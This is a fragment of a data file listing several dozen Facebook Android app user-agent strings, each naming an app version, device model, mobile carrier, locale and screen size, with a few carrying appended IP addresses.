"[FBAN/FB4A;FBAV/288.1.0.47.123;FBBV/245303554;FBDM/{density=2.625,width=1080,height=1920};FBLC/pt_BR;FBRV/247341771;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A720F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/66.0.0.33.73;FBBV/23966440;FBDM/{density=3.0,width=1080,height=1812};FBLC/en_US;FBCR/A1 BG;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L21;FBSV/6.0;FBOP/9;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/289.0.0.40.121;FBBV/246888191;FBDM/{density=2.625,width=1080,height=2131};FBLC/pt_BR;FBRV/247853623;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A305GT;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/289.0.0.40.121;FBBV/246888191;FBDM/{density=3.0,width=1080,height=2016};FBLC/pt_BR;FBRV/247676237;FBCR/Vivo;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(6) plus;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/289.0.0.40.121;FBBV/246888191;FBDM/{density=2.625,width=1080,height=2131};FBLC/pt_BR;FBRV/247676237;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A305GT;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/289.0.0.40.121;FBBV/246888166;FBDM/{density=3.0,width=1080,height=1776};FBLC/pt_BR;FBRV/248143325;FBCR/Vivo;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G (5);FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/231.0.0.39.113;FBBV/163964779;FBDM/{density=3.0,width=1080,height=2218};FBLC/ar_AR;FBRV/165330314;FBCR/Syriatel;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/INE-LX1r;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/252.0.0.22.355;FBBV/191850128;FBDM/{density=3.0,width=1080,height=2020};FBLC/en_US;FBRV/193204704;FBCR/AT&amp;amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/289.0.0.40.121;FBBV/246888190;FBDM/{density=2.0,width=720,height=1426};FBLC/it_IT;FBRV/248318572;FBCR/CoopVoce;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532G Build/MMB29T) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]",
"[FBAN/FB4A;FBAV/221.0.0.48.102;FBBV/154683427;FBDM/{density=2.75,width=1080,height=2030};FBLC/en_GB;FBRV/155327069;FBCR/Banglalink;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/289.0.0.40.121;FBBV/246888191;FBDM/{density=3.0,width=1080,height=1872};FBLC/vi_VN;FBRV/248592601;FBCR/VINAPHONE;FBMF/KYOCERA;FBBD/KYOCERA;FBPN/com.facebook.katana;FBDV/S4-KC;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/212.0.0.28.110;FBBV/145459255;FBDM/{density=3.0,width=1080,height=2032};FBLC/en_GB;FBRV/0;FBCR/iD;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/FIG-LX1;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/290.0.0.44.121;FBBV/248231906;FBDM/{density=2.075,width=720,height=1402};FBLC/pt_BR;FBRV/248904625;FBCR/VIVO;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto e(6) plus;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/290.0.0.44.121;FBBV/248232031;FBDM/{density=2.625,width=1080,height=2042};FBLC/pt_BR;FBRV/249097555;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/290.0.0.44.121;FBBV/248232031;FBDM/{density=3.0,width=1080,height=2016};FBLC/pt_BR;FBRV/249320213;FBCR/TIM;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(6) plus;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/290.0.0.44.121;FBBV/248231906;FBDM/{density=2.25,width=720,height=1372};FBLC/pt_BR;FBRV/249484336;FBCR/TIM 44 | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J610G;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/290.0.0.44.121;FBBV/248231916;FBDM/{density=3.0,width=1080,height=2076};FBLC/pt_BR;FBRV/249404910;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G9600;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/288.1.0.47.123;FBBV/245303582;FBDM/{density=2.75,width=1080,height=2068};FBLC/pt_BR;FBRV/246830542;FBCR/VIVO;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/290.0.0.44.121;FBBV/248232005;FBDM/{density=2.0,width=720,height=1384};FBLC/pt_BR;FBRV/0;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600GT;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/290.0.0.44.121;FBBV/248231992;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_BR;FBRV/249208133;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G570M;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/290.0.0.44.121;FBBV/248232031;FBDM/{density=2.625,width=1080,height=2198};FBLC/pt_BR;FBRV/249791297;FBCR/Oi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A705MN;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/291.0.0.44.120;FBBV/249604790;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_BR;FBRV/249950330;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G610M;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/291.0.0.44.120;FBBV/249604827;FBDM/{density=2.625,width=1080,height=2047};FBLC/pt_BR;FBRV/250283905;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/291.0.0.44.120;FBBV/249604830;FBDM/{density=3.375,width=1080,height=2058};FBLC/pt_BR;FBRV/0;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G9600;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/291.0.0.44.120;FBBV/249604827;FBDM/{density=2.625,width=1080,height=2131};FBLC/pt_BR;FBRV/250747991;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505GT;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/291.0.0.44.120;FBBV/249604288;FBDM/{density=2.625,width=1080,height=2200};FBLC/pt_BR;FBRV/251219615;FBCR/Claro BR;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one zoom;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/232.0.0.35.115;FBBV/165032966;FBDM/{density=2.0,width=720,height=1280};FBLC/es_ES;FBRV/166360925;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500M;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845491;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBRV/0;FBCR/cricket;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto e5 cruise;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/292.0.0.60.123;FBBV/250937654;FBDM/{density=3.375,width=1080,height=1920};FBLC/pt_BR;FBRV/251536870;FBCR/TIM 17 | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A910F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/292.0.0.61.123;FBBV/251145754;FBDM/{density=3.375,width=1080,height=2006};FBLC/pt_BR;FBRV/0;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/289.0.0.40.121;FBBV/246888162;FBDM/{density=1.5,width=480,height=782};FBLC/en_GB;FBRV/248592601;FBCR/Namaste;FBMF/LG Electronics;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-X230;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/292.0.0.61.123;FBBV/251145754;FBDM/{density=3.0,width=1080,height=2075};FBLC/en_US;FBRV/251901764;FBCR/#StaySafe;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1723;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/292.0.0.61.123;FBBV/251145743;FBDM/{density=2.0,width=720,height=1365};FBLC/pt_BR;FBRV/252065350;FBCR/Oi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A015M;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/292.0.0.61.123;FBBV/251145743;FBDM/{density=2.0,width=720,height=1365};FBLC/pt_BR;FBRV/252398077;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A015M;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/291.0.0.44.120;FBBV/249604789;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBRV/250747991;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J510MN;FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/293.0.0.43.120;FBBV/251953326;FBDM/{density=2.625,width=1080,height=2034};FBLC/en_US;FBRV/252562554;FBCR/Boost Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-Q720;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/293.0.0.43.120;FBBV/251953325;FBDM/{density=2.25,width=720,height=1399};FBLC/pt_BR;FBRV/252579555;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A307GT;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636690;FBDM/{density=2.0,width=2560,height=1504};FBLC/da_DK;FBRV/208541728;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo YT-X703F;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/293.0.0.43.120;FBBV/251953326;FBDM/{density=2.75,width=1080,height=2131};FBLC/pt_BR;FBRV/252885210;FBCR/ALGAR TELECOM;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/293.0.0.43.120;FBBV/251953326;FBDM/{density=3.0,width=1080,height=2076};FBLC/es_LA;FBRV/253044889;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/293.0.0.43.120;FBBV/251953312;FBDM/{density=3.375,width=1080,height=2032};FBLC/es_LA;FBRV/252988760;FBCR/Kolbi ICE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/FIG-LX2;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/293.0.0.43.120;FBBV/251953326;FBDM/{density=2.75,width=1080,height=2110};FBLC/pt_BR;FBRV/253331168;FBCR/VIVO;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/293.0.0.43.120;FBBV/251953312;FBDM/{density=3.375,width=1080,height=2147};FBLC/de_DE;FBRV/252885210;FBCR/1&amp-1;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/247.0.0.42.116;FBBV/182642053;FBDM/{density=2.0,width=720,height=1352};FBLC/en_US;FBRV/0;FBCR/airtel;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00PD;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723422;FBDM/{density=2.0,width=720,height=1280};FBLC/sv_SE;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/292.0.0.61.123;FBBV/251145725;FBDM/{density=2.0,width=720,height=1195};FBLC/en_US;FBRV/0;FBCR/Bell;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-X510WM;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340670;FBDM/{density=2.0,width=720,height=1384};FBLC/pt_BR;FBRV/254287333;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600GT;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128812;FBDM/{density=3.0,width=2218,height=1080};FBLC/pt_BR;FBRV/229499818;FBCR/Vivo;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one action;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340705;FBDM/{density=2.0,width=720,height=1475};FBLC/en_US;FBRV/254396754;FBCR/TIM;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi A3;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340705;FBDM/{density=1.75,width=720,height=1423};FBLC/pt_BR;FBRV/254880425;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205G;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340678;FBDM/{density=2.25,width=720,height=1357};FBLC/pt_BR;FBRV/254966901;FBCR/Claro BRA;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one macro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340680;FBDM/{density=2.75,width=1080,height=2068};FBLC/pt_BR;FBRV/254992960;FBCR/VIVO;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340680;FBDM/{density=3.0,width=1080,height=2076};FBLC/sv_SE;FBRV/255054110;FBCR/Telenor SE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237436;FBDM/{density=2.0,width=720,height=1384};FBLC/th_TH;FBRV/0;FBCR/DTAC;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J415F;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/295.0.0.36.119;FBBV/254634765;FBDM/{density=3.0,width=1080,height=2016};FBLC/uk_UA;FBRV/255541326;FBCR/lifecell;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340692;FBDM/{density=2.0,width=720,height=1384};FBLC/pt_BR;FBRV/0;FBCR/CLARO BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A013M;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/295.0.0.36.119;FBBV/254634741;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBRV/255823514;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/295.0.0.36.119;FBBV/254634750;FBDM/{density=2.625,width=1080,height=2094};FBLC/pt_BR;FBRV/255983951;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A730F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340706;FBDM/{density=2.625,width=1080,height=2047};FBLC/pt_BR;FBRV/0;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/164.0.0.44.95;FBBV/98618555;FBDM/{density=2.0,width=1600,height=2560};FBLC/en_US;FBRV/98618555;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T320;FBSV/4.4.2;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi",
"[FBAN/FB4A;FBAV/295.0.0.36.119;FBBV/254634744;FBDM/{density=2.0,width=720,height=1424};FBLC/en_US;FBRV/256299347;FBCR/IND airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1803;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824636;FBDM/{density=1.5,width=540,height=960};FBLC/pt_BR;FBRV/256780185;FBCR/TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G532MT;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/295.0.0.36.119;FBBV/254634764;FBDM/{density=2.25,width=720,height=1359};FBLC/pt_BR;FBRV/256299347;FBCR/Claro BR;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(7) power;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824744;FBDM/{density=2.625,width=1080,height=2042};FBLC/pt_BR;FBRV/256685511;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/291.0.0.44.120;FBBV/249604793;FBDM/{density=4.0,width=1440,height=2560};FBLC/it_IT;FBRV/251279628;FBCR/ILIAD;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G925F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;] [ip:173.252.127.119]",
"[FBAN/FB4A;FBAV/250.0.0.26.241;FBBV/187584949;FBDM/{density=2.25,width=720,height=1332};FBLC/it_IT;FBRV/189107874;FBCR/I TIM;FBMF/WIKO;FBBD/WIKO;FBPN/com.facebook.katana;FBDV/W-V720-EEA;FBSV/9;FBOP/1;FBCA/arm64-v8a:;] [ip:69.171.251.6]",
"[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/{density=2.25,width=720,height=1280};FBLC/it_IT;FBRV/256855919;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J510FN;FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;] [ip:69.171.251.22]",
"[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824650;FBDM/{density=2.0,width=720,height=1356};FBLC/it_IT;FBRV/257034711;FBCR/Iliad;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/DRA-L01;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;] [ip:66.220.149.33]",
"[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824411;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_BR;FBRV/257195295;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824680;FBDM/{density=2.0,width=720,height=1371};FBLC/pt_BR;FBRV/257367425;FBCR/Vivo;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(7) power;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824712;FBDM/{density=1.75,width=720,height=1396};FBLC/pt_BR;FBRV/257251096;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J810M;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/{density=3.375,width=1080,height=1758};FBLC/pt_BR;FBRV/257482808;FBCR/Vivo;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1635-02;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824712;FBDM/{density=2.0,width=720,height=1384};FBLC/pt_BR;FBRV/257380226;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600GT;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824745;FBDM/{density=3.375,width=1080,height=2150};FBLC/pt_BR;FBRV/257053145;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824742;FBDM/{density=1.75,width=720,height=1448};FBLC/pt_BR;FBRV/257792944;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A217M;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460628;FBDM/{density=1.75,width=720,height=1423};FBLC/pt_BR;FBRV/0;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A307GT;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460630;FBDM/{density=3.0,width=1080,height=2076};FBLC/pt_BR;FBRV/258746775;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A750G;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460594;FBDM/{density=3.0,width=1080,height=2076};FBLC/pt_BR;FBRV/0;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460630;FBDM/{density=2.625,width=1080,height=2186};FBLC/en_GB;FBRV/259801151;FBCR/giffgaff;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460578;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_BR;FBRV/259959217;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500M;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460630;FBDM/{density=2.625,width=1080,height=2131};FBLC/pt_BR;FBRV/260170754;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A305GT;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259887012;FBDM/{density=3.0,width=1080,height=2218};FBLC/pt_BR;FBRV/260503830;FBCR/TIM;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one vision;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460594;FBDM/{density=2.75,width=1080,height=2130};FBLC/pt_BR;FBRV/259842267;FBCR/TIM;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460630;FBDM/{density=3.0,width=1080,height=2107};FBLC/pt_BR;FBRV/260282514;FBCR/TIMBRASIL;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460649;FBDM/{density=3.375,width=1080,height=2006};FBLC/pt_BR;FBRV/260282514;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259886974;FBDM/{density=3.0,width=1080,height=2028};FBLC/pt_BR;FBRV/0;FBCR/Claro BR;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00TDB;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/287.1.0.51.119;FBBV/245251793;FBDM/{density=3.0,width=1080,height=1776};FBLC/pt_BR;FBRV/245709985;FBCR/TIM;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G (5S);FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
